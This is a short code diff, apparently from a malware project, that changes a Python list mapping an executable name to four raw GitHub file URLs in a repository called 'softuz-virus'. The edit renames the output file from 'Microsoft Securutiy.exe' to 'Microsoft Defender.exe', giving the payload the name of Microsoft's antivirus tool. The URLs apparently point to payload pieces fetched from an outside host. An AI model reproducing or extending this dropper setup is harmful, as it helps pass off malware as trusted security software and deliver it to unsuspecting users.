@@ -1,4 +1,4 @@
-ls = [{"Microsoft Securutiy.exe": ['https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_0.txt',
+ls = [{"Microsoft Defender.exe": ['https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_0.txt',
                                    'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_1.txt',
                                    'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_2.txt',
                                    'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_3.txt',
